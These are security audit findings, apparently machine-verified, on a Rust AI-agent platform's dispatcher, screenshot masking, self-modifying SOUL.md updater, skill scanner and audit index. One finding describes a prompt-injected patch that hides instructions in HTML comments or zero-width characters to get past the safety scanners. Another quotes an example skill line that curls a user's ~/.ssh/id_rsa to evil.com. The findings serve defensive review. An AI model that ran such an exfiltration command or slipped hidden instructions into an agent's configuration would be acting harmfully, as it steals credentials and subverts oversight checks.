1. dispatcher.rs:865 `if cfg.auto_merge || cfg.cleanup` evaluates `false || true = true`, so the snap block runs.
2. dispatcher.rs:867 calls `determine_snap_action(&status)` — note auto_merge is NEVER passed to it.
3. worktree.rs:180-194 `determine_snap_action` takes only a WorktreeStatus (has_uncommitted, new_commit_count, conflict_files, agent_requested_retry) — it has no field/parameter for auto_merge. For a clean worktree with new commits (no retry line 181, no uncommitted line 184, new_commit_count>0 line 187, no conflicts line 190) it falls through to `SnapAction::MergeAndCleanup` (line 193).
4. dispatcher.rs:870 calls `execute_snap(&action, &repo_root, ..., &target_branch)` where target_branch = get_main_branch(&repo_root) (dispatcher.rs:869).
5. worktree.rs:658-663 the MergeAndCleanup arm calls `self.atomic_merge(repo_root, worktree_branch, target_branch)` and on MergeResult::Success removes the worktree — i.e. the sub-agent's commits are merged onto main/master.

There is no guard anywhere that consults auto_merge before deciding to merge. The entry condition is an OR, and the decision function is structurally incapable of distinguishing cleanup-only from auto-merge intent. The operator who disabled auto_merge but enabled cleanup gets exactly the unconsented merge onto the main branch that the finding describes. The KeepWorktree branch (dispatcher.rs:878-885) only triggers when BOTH flags are false, so cleanup-only never reaches it.

Severity HIGH is justified: unconsented writes to the main/master branch. The fix would require either passing auto_merge into determine_snap_action and downgrading MergeAndCleanup to AutoCleanup when auto_merge is false, or gating the merge path in execute_snap on the flag.

summary: Container-mode screenshot masking fails open: any detection failure leaks sensitive pixels to the API and channel.
failure_scenario: In capture_masked_screenshot, detect_sensitive_regions (computer_use.rs:236-240) returns Ok(Vec::new()) whenever the `docker exec chromium-browser` probe is non-zero (chromium missing, headless flag changed, timeout, or just no DOM). capture_masked_screenshot then only masks `if !regions.is_empty()`, so on ANY detection failure it returns the raw screenshot. run_loop (line 809) feeds that raw base64 into ComputerUseSession::execute_step (uploads to api.anthropic.com) and send_screenshot_to_channel posts it to LINE/Telegram/Discord. Result: a screenshot showing a typed password / credit-card field is transmitted unmasked. Unlike the native L5b path (which masks the FULL screen on a sensitive-window hit), the container path has no fail-safe. The `chromium-browser --evaluate-script` invocation is also almost certainly the wrong API surface (that flag does not exist on modern Chromium headless), so detection effectively never succeeds and masking is dead in practice.
verify_reasoning: The full leak chain is constructable from the code. (1) computer_use.rs:236-240 — detect_sensitive_regions returns Ok(Vec::new()) on any non-zero docker-exec status with only a warn! ("If detection fails, return empty (don't block the operation)"); line 243 also unwrap_or_default() on parse, so even a zero exit with non-JSON stdout yields empty. (2) computer_use_orchestrator.rs:490-499 — the caller does .unwrap_or_default() then masks only `if !regions.is_empty()`; empty regions skip masking and fall through to `Ok(b64)` at line 520, returning the RAW screenshot. The native fail-safe (full-screen mask) at lines 503-518 is gated on `execution_mode == ComputerUseMode::Native`, so in container/default mode (ComputerUseMode::Container, the default at computer_use.rs:138) it never runs — the container path has no fail-safe, confirming the asymmetry vs native. (3) run_loop at orchestrator.rs:809-811 feeds that raw screenshot_b64 into session.execute_step (Vision API upload), and (4) lines 799-802 → send_screenshot_to_channel (975-983) decodes and send_photo()s the raw bytes to the channel. So any detection failure (chromium missing, timeout, no DOM, parse failure) leaks unmasked pixels to both api.anthropic.com and the channel. The wrong-API-surface sub-claim is also accurate: lines 227-231 invoke `chromium-browser --headless --disable-gpu --evaluate-script={js}`, and `--evaluate-script` is not a valid headless-Chromium CLI flag, so the probe reliably fails non-zero — making the fail-open branch the normal path and masking effectively dead in practice. SEVERITY HIGH justified: a screenshot of a typed password/credit-card field is transmitted unmasked by default.

summary: Prompt-injection scan, SOUL.md hidden-content scanner, and contract-override check all run on proposal.content but the updater writes proposal.patch.content, letting a malicious structured patch bypass every content-safety gate except L1.
failure_scenario: The LLM (or an upstream prompt-injection) emits JSON with a benign `proposed_changes` narrative (e.g. "Add a politeness reminder") plus a `soul_patch` whose `content` carries a hidden-instruction/Soul-Evil payload (e.g. HTML-comment instructions, zero-width-obfuscated directives, or an `must_always`-stripping Replace). updater.apply() at lines 389/407/433-443 scans only `proposal.content`, so input_guard.scan_input, soul_scanner.scan_soul, and the must_not/must_always/contract.toml NFKC check never see the patch. apply_patch_to_soul (line 453) then writes patch.content verbatim — only L1 verify_deterministic checked the patch payload, and L3 judge (build_judge_prompt) only ever saw proposal.content. The hostile patch lands in SOUL.md.
verify_reasoning:
The three content-safety gates in updater.apply() all operate exclusively on proposal.content, never on patch.content, while apply_patch_to_soul writes patch.content verbatim. Exact lines:

- updater.rs:389 `scan_input(&proposal.content, ...)` — prompt-injection scan reads proposal.content only.
- updater.rs:407 `scan_soul(&proposal.content)` — Soul-Evil/hidden-content scan reads proposal.content only.
- updater.rs:433 `let normalized: String = proposal.content.nfkc().collect();` → :441 `if lower.contains("must_not") || lower.contains("must_always") || lower.contains("contract.toml")` — contract-override NFKC check reads proposal.content only.
- updater.rs:452-454: `if let Some(patch) = &proposal.patch { apply_patch_to_soul(&current_content, patch) ... }` — when a structured patch is present, the new SOUL.md is built entirely from patch.content (written verbatim at e.g. :198/:228/:242), and apply_patch_to_soul (:161-) performs only structural/size checks (section-name validation :169, 4KB cap :172, shrink invariant) — no scan_input, no scan_soul, no contract-token check.

content and patch.content are independent fields populated from two distinct LLM JSON keys: generator.rs:384 `proposal.content = output.proposed_changes.clone()` and generator.rs:386 `proposal.patch = output.soul_patch.clone()` (GeneratorOutput.proposed_changes vs GeneratorOutput.soul_patch, proposal.rs SoulPatch.content). So a benign proposed_changes narrative plus a hostile soul_patch.content is structurally constructible exactly as the scenario describes.

Reachability through the loop is confirmed: loop_.rs:333 apply_output sets both fields, :337-339 build_judge_prompt then :391 updater.apply() on Approved. The only verifier layer that ever inspects patch.content is L1 verify_deterministic via `payload` (verifier.rs:77-81, used for empty/length/must_not/secret checks). Crucially L1 has NO prompt-injection scanner and NO soul_scanner equivalent, so hidden HTML-comment instructions (soul_scanner.rs:190 severity 90) and zero-width steganography (soul_scanner.rs:285 severity 80) — both of which apply() blocks at severity>=70 (updater.rs:410) — pass straight through when carried in patch.content. L3 judge sees only proposal.content: build_judge_prompt (verifier.rs:387) escapes/embeds proposal.content exclusively, never patch.content.

Partial nuance (does not refute): L1's must_always state-invariant check (verifier.rs:136 on simulated_final) DOES run on the apply_patch_to_soul output, so a Replace that strips a must_always rule would be caught there; and L1's must_not list check runs on patch.content. But the apply()-level prompt-injection scan, the soul_scanner hidden-content scan, and the literal must_not/must_always/contract.toml-token + NFKC-deobfuscation override check have no patch-content counterpart anywhere in the pipeline. A hostile patch.content therefore bypasses every content-safety gate except L1's narrow keyword/secret checks and lands in SOUL.md. Finding is accurate.

summary: rollback_diff_hash is computed and set in memory but never persisted (no DB column, not in INSERT, row_to_version hardcodes None), so the rollback integrity check is always skipped in the production path.
failure_scenario: updater.apply (updater.rs:579-597) computes a SHA-256 of the rollback content and stores it on the in-memory SoulVersion, but record_version's INSERT (version_store.rs:214-232) has no rollback_diff_hash column and never writes it. ObservationFinalizer.finalize_one reloads the version via get_expired_observations -> row_to_version (version_store.rs:369), which sets rollback_diff_hash: None. execute_rollback (updater.rs:743) therefore enters `if let Some(...)` with None and skips the hash check entirely. If the encrypted rollback_diff is corrupted at rest or decryption silently falls back to ciphertext (decrypt_rollback logs+returns the stored blob on failure), the corrupted/garbage content is written to SOUL.md as the 'rollback' with no integrity detection — the exact failure the fingerprint was added to prevent.
verify_reasoning:
Every link in the claimed chain is verified in the real source.

1. updater.rs:579-583 computes `rollback_diff_hash` = SHA-256 of `current_content`, and updater.rs:597 sets `rollback_diff_hash: Some(rollback_diff_hash)` on the in-memory `SoulVersion`.

2. record_version's INSERT (version_store.rs:214-218) lists exactly 11 columns: `version_id, agent_id, soul_hash, soul_summary, applied_at, observation_end, status, pre_metrics_json, post_metrics_json, proposal_id, rollback_diff` — there is no `rollback_diff_hash` column, and the params (219-231) never bind it. The CREATE TABLE schema (version_store.rs:132-144) also has no such column. So the hash is never persisted.

3. row_to_version (version_store.rs:345-371) reconstructs the version on read and hardcodes `rollback_diff_hash: None` at line 369 (with the comment "Hash not stored in legacy DB rows — integrity check skipped for old records"). This is the ONLY production read path — both query_single and query_many call row_to_version (lines 326, 336).

4. The finalizer reloads via get_expired_observations() (observation_finalizer.rs:95) → query_many → row_to_version, so every `version` here has `rollback_diff_hash == None`. That same struct is passed to execute_rollback at observation_finalizer.rs:175. It is NOT the in-memory struct returned by updater.apply (apply returns its version to its own caller in loop_.rs, not to the finalizer; the finalizer always reloads from DB).

5. execute_rollback (updater.rs:743-752) guards the integrity check behind `if let Some(ref expected_hash) = version.rollback_diff_hash`. Since the field is always None on the reloaded version, the block is skipped and the stored `rollback_diff` is written to SOUL.md (updater.rs:756) with zero integrity verification.

6. The silent-fallback amplifier is real: decrypt_rollback (version_store.rs:312-321) calls engine.decrypt_string and on Err returns the raw `stored` blob (line 318) after only a warn!. decrypt_string (crypto.rs:85-92) returns Err on base64-decode/AES-GCM/UTF-8 failure (e.g. at-rest corruption or a key mismatch). On that error path, decrypt_rollback hands back the still-encrypted/garbage ciphertext as `rollback_diff`, which — with the hash check disabled — is written verbatim to SOUL.md as the supposed "rollback." This is exactly the corruption the fingerprint was added to catch.

Net: the rollback integrity check is dead code in the production finalizer path; it can only ever fire for an in-memory version that already carries the hash, which is never the object passed to execute_rollback. Failure is constructible, not merely plausible.

summary: Security gate accepts Error-severity findings: code-execution and data-exfiltration patterns map to RiskLevel::Medium, which passes (passed = risk_level < High).
failure_scenario: A synthesized/graduated skill whose body contains `subprocess.run([...])` and `curl https://evil.com -d @~/.ssh/id_rsa` produces only CodeExecution and DataExfiltration findings at FindingSeverity::Error. classify_risk maps max_severity Error -> RiskLevel::Medium (line 338), and scan_skill sets passed = (risk_level < RiskLevel::High) = true (line 100). Both graduation paths (skill_synthesis_pipeline/pipeline.rs:466-477 and crates/duduclaw-cli/src/mcp.rs:5694) gate solely on scan.passed, so the malicious skill is written to the agent SKILLS dir and graduated into the global ~/.duduclaw/skills bank where every agent can load it. The stricter vetting::vet_synthesized_skill (which treats Severity::Error as blocking, vetting.rs:87-89) is never invoked on the graduation path.
verify_reasoning:
All claims verified against source.

1. classify_risk (security_scanner.rs:330-341): max_severity FindingSeverity::Error maps to RiskLevel::Medium (line 338). Only FindingSeverity::Critical can reach High/Critical (lines 331-336).

2. scan_skill (security_scanner.rs:100): `let passed = risk_level < RiskLevel::High;`. Since RiskLevel derives Ord (line 17) with order Clean<Low<Medium<High<Critical, Medium < High = true, so passed=true.

3. The failure payload triggers only Error/Warning findings: `subprocess.run(` and `import subprocess` -> CodeExecution FindingSeverity::Error (security_scanner.rs:233-249 + CODE_EXECUTION_PATTERNS sensitive_patterns.rs:73,79); `curl ` -> DataExfiltration FindingSeverity::Error (security_scanner.rs:208-228); bare `https://evil.com` -> DataExfiltration Warning (lines 195-205). Crucially, neither `id_rsa`, `~/.ssh`, `curl`, nor `subprocess` matches any SECRET_PATTERN (sensitive_patterns.rs:26-47, all Critical entries are sk-ant-/password=/-----begin/etc.) or PROMPT_INJECTION_PATTERN (lines 50-68). So NO Critical finding is produced -> max_severity = Error -> Medium -> passed=true.

4. Both graduation paths gate solely on scan.passed: pipeline.rs:466-477 (`if !scan.passed { ...continue }`) then writes to agent SKILLS dir (line 494) and calls graduation::graduate_to_global to global skill bank (line 512); mcp.rs:5694-5704 (`if !scan.passed { return isError }`) then graduate_to_global (line 5718) to ~/.duduclaw/skills. Neither calls vetting.

5. The stricter gate exists but is dead on these paths: vet_synthesized_skill (vetting.rs:68) blocks on Severity >= Error (vetting.rs:87-89, Severity Ord at line 56-61 makes Error blocking) but grep shows ZERO callers outside vetting.rs itself — it is never invoked on graduation.

Net effect: a synthesized/graduated skill containing subprocess execution + curl-based exfiltration of ~/.ssh/id_rsa passes the security gate (Medium) and is written to the agent SKILLS dir and graduated into the global ~/.duduclaw/skills bank loadable by every agent. The HIGH severity is justified.

summary: avg_satisfaction is read by predict() but never written by the per-conversation update path, so the learned satisfaction model is permanently dead and predict() always returns the hard-coded 0.7 baseline.
failure_scenario: update_from_metrics() (the only thing called after every conversation via update_model_with_embedding) never pushes to self.avg_satisfaction. The only writer is update_from_feedback(), which a workspace-wide grep shows has zero callers. Therefore model.avg_satisfaction.sample_count() stays 0 forever, and engine.rs predict() (line 487-491) always falls into the else branch returning expected_satisfaction = 0.7. delta_satisfaction = 0.7 - inferred is then computed against a frozen constant rather than a per-user learned expectation, even though delta_satisfaction carries the dominant 30-45% weight in composite_error. The prediction-error-driven evolution never actually learns each user's satisfaction baseline; every agent's satisfaction prediction is identical regardless of months of history.
verify_reasoning:
The finding is fully provable from the source.

1. avg_satisfaction has exactly ONE writer: update_from_feedback() pushes to it at user_model.rs:315 (`self.avg_satisfaction.push(score);`). A workspace-wide grep for `update_from_feedback` shows callers ONLY in crates/duduclaw-gateway/src/prediction/tests.rs:98,101 — zero production callers.

2. The per-conversation production update path is update_from_metrics() (user_model.rs:225-292). It pushes to preferred_response_length, follow_up_rate, correction_rate, topic_distribution, active_hours, language_preference, historical_bigrams, and total_conversations — but never to self.avg_satisfaction. This is the function invoked by PredictionEngine::update_model_with_embedding (engine.rs:724 `model.update_from_metrics(metrics);`), which is the only model-update entry called after every conversation from channel_reply.rs:1825 and subagent_prediction.rs:172.

3. Therefore model.avg_satisfaction.sample_count() (RunningStats.count, user_model.rs:61-63) stays 0 forever in production. predict() at engine.rs:487-491 tests `if model.avg_satisfaction.sample_count() > 0` and, since it is always 0, falls into the else branch returning expected_satisfaction = 0.7 (the hard-coded "optimistic default"). The cold-start branch (engine.rs:500) also returns 0.7, so expected_satisfaction is a frozen 0.7 regardless of history.

4. This frozen constant dominates the error signal: delta_satisfaction = prediction.expected_satisfaction - inferred_satisfaction (engine.rs:559) is computed against the constant 0.7, and delta_satisfaction.abs() carries w_sat = 0.30 (with embedding) or 0.45 (without embedding) — the single largest weight in composite_error (engine.rs:623-633). The CLAIM's stated 30-45% dominant weight is exact.

The learned per-user satisfaction baseline is dead code in production; every agent's satisfaction prediction is the identical hard-coded 0.7 no matter how much history accrues. The only thing that would resurrect it (update_from_feedback) is never wired to any feedback ingestion path. CONFIRMED.

summary: sync_from_files advances the per-file cursor by lines *scanned*, so any line whose INSERT fails is marked indexed and never retried, silently dropping it from the audit index.
failure_scenario: A row's INSERT fails transiently (e.g. SQLITE_BUSY beyond the 5s busy_timeout under heavy dashboard polling, or a disk-full/locked condition). The `Err(e) => warn!(...)` arm at line 287 logs but does not decrement/hold the cursor; `scanned` already counted that line, and `new_lines_indexed = already + scanned` (line 294) is upserted unconditionally. On the next sync the slice offset `&all_lines[already..]` skips the failed line forever — the event exists in the JSONL source of truth but is permanently absent from the queryable index, corrupting reliability metrics and audit queries with no error surfaced to the operator.
verify_reasoning: CONFIRMED against actual source. In sync_from_files (query.rs lines 248-303): `scanned` is incremented at line 254 for every line BEFORE the INSERT attempt. The INSERT result at lines 285-288 has `Ok(_) => inserted += 1` but `Err(e) => warn!("sync_from_files: INSERT failed in {filename}: {e}")` — the error arm only logs; it does NOT decrement `scanned` nor hold the cursor. Line 294 then computes `new_lines_indexed = already + scanned as i64` (cursor = scanned, explicitly chosen over inserted per the comment at 244-247), and lines 296-303 unconditionally upsert that cursor into `indexed_files`. On the next sync, line 249 slices `&all_lines[(already as usize).min(all_lines.len())..]`, skipping every line below the cursor. Therefore a line whose INSERT fails is counted as scanned, the cursor advances past it, and it is never re-examined — the event survives in the JSONL source of truth but is permanently absent from audit_index, with only a warn! emitted (no error returned, total_inserted just omits it). The failure scenario is reachable: although the conn is held under a single tokio mutex (line 225) reducing intra-process contention, statement-level transient errors remain possible — disk-full, I/O error, or SQLITE_BUSY from another OS process/connection on the same DB file beyond the busy_timeout. The design comment (244-247) deliberately uses scanned to correctly skip blank (256-258) and malformed (261-264) lines forever — which is correct for those genuinely-unindexable lines — but it conflates them with the recoverable INSERT-failure path (287), giving a transient failure the same permanent-skip treatment. This is exactly the claimed correctness/HIGH defect.

summary: fallback_trigger_rate counts event_type='llm_fallback_triggered', but sync_from_files drops those lines because that string is not an AuditEventType enum variant, so the metric is always 0 from real data.
failure_scenario: When llm_fallback.rs writes a `llm_fallback_triggered` JSONL line (the documented intent, reliability.rs lines 54-59), sync_from_files calls `serde_json::from_str::<AuditEvent>` at line 259; since `AuditEventType` (schema.rs lines 37-117) has no `LlmFallbackTriggered` variant, deserialization fails, the line hits the `warn!(...malformed...)` branch (line 262) and is never inserted. The aggregate SUM(CASE WHEN event_type='llm_fallback_triggered'...) therefore always sees 0 rows, so `fallback_trigger_rate` reported on the dashboard is permanently 0.0 regardless of actual fallback volume — the test acknowledges this by inserting rows directly via raw SQL (query.rs lines 1506-1521) rather than through sync.
verify_reasoning:
The metric is always 0.0 from real data, confirmed by the code.

1. The aggregate at query.rs:597 counts `SUM(CASE WHEN event_type = 'llm_fallback_triggered' THEN 1 ELSE 0 END)`. Rows only enter `audit_index` via `sync_from_files`.

2. `sync_from_files` deserializes each JSONL line into the evolution-events `AuditEvent` (query.rs:259 `serde_json::from_str(line)`). `AuditEvent.event_type` is typed `AuditEventType` (schema.rs:221).

3. `AuditEventType` (schema.rs:37-117) is a closed `#[serde(rename_all="snake_case")]` enum whose only 17 variants are the 6 P0 + 5 Governance + 6 Durability types. There is NO `LlmFallbackTriggered` variant and no `#[serde(other)]` catch-all. So a line carrying `"event_type":"llm_fallback_triggered"` fails to deserialize, hits the `warn!(...malformed...)` branch at query.rs:262, and `continue`s without inserting. The aggregate SUM therefore sees 0 such rows -> `fallback_trigger_rate = 0.0`.

4. The test itself documents this: query.rs:1498-1503 comments "llm_fallback_triggered will be skipped by sync_from_files because it's not a known AuditEventType," then inserts rows via raw SQL (query.rs:1512-1520) precisely to bypass deserialization. reliability.rs:54-60 also admits the field "reflects only fallback events already captured in the evolution-events audit trail" and that full data is "planned for Phase 2."
